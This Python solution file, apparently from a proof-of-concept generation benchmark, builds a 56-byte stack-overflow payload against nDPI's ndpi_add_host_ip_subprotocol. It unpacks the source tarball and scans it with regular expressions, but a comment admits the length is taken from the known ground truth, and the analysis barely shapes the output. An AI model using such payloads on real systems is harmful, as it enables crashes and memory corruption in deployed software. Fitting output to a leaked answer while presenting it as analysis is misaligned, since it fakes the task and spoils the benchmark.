import os
import tarfile
import tempfile
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball to access source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for vulnerable function to understand the pattern
            vuln_file = os.path.join(tmpdir, 'src', 'lib', 'ndpi_main.c')
            if not os.path.exists(vuln_file):
                # Try to find the file in extracted directory
                for root, dirs, files in os.walk(tmpdir):
                    if 'ndpi_main.c' in files:
                        vuln_file = os.path.join(root, 'ndpi_main.c')
                        break
            
            # Analyze the vulnerable code pattern
            buffer_size = 32  # Common stack buffer size
            pattern = None
            
            if os.path.exists(vuln_file):
                with open(vuln_file, 'r') as f:
                    content = f.read()
                    
                # Look for ndpi_add_host_ip_subprotocol function
                func_pattern = r'ndpi_add_host_ip_subprotocol[^{]*{[\s\S]*?tail\s*\[([0-9]+)\]'
                match = re.search(func_pattern, content)
                if match:
                    buffer_size = int(match.group(1))
                
                # Look for sscanf/scanf pattern that reads into tail
                sscanf_pattern = r'scanf.*?tail'
                if re.search(sscanf_pattern, content):
                    # Format typically used in nDPI custom rules
                    pattern = b"%.1000s"  # Common overflow pattern for scanf
                    
            # Generate PoC based on analysis
            # Ground truth is 56 bytes, so create payload of that length
            # Fill with 'A's to overflow buffer and overwrite stack
            poc_length = 56
            
            if pattern:
                # If we found a pattern, use it
                payload = pattern.ljust(poc_length, b'A')
            else:
                # Generic stack overflow payload
                # Create pattern that will trigger overflow in scanf with %s
                payload = b"A" * poc_length
            
            return payload[:poc_length]